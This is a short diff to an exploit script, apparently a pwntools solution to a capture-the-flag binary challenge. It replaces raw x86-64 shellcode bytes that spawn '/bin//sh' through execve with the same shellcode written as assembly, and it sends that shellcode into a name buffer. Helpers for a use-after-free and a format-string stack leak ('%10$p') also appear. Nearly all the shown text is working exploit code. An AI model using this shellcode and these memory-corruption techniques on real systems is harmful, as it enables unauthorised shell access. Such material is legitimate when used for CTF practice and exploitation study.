@@ -36,7 +36,20 @@ def uaf_echo(r, s):
 STACK = 0
 
 def write_shellcode_to_name(r):
-    r.sendlineafter(b": ", b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05")
+    sh = asm("""
+    xor esi, esi
+    mov rbx, 0x68732f2f6e69622f
+    push rsi
+    push rbx
+    push rsp
+    pop rdi
+    push 59
+    pop rax
+    xor edx, edx
+    syscall
+    """)
+
+    r.sendlineafter(b": ", sh)
     
 def leak_stack(r):
     fsb_echo(r, b"%10$p")
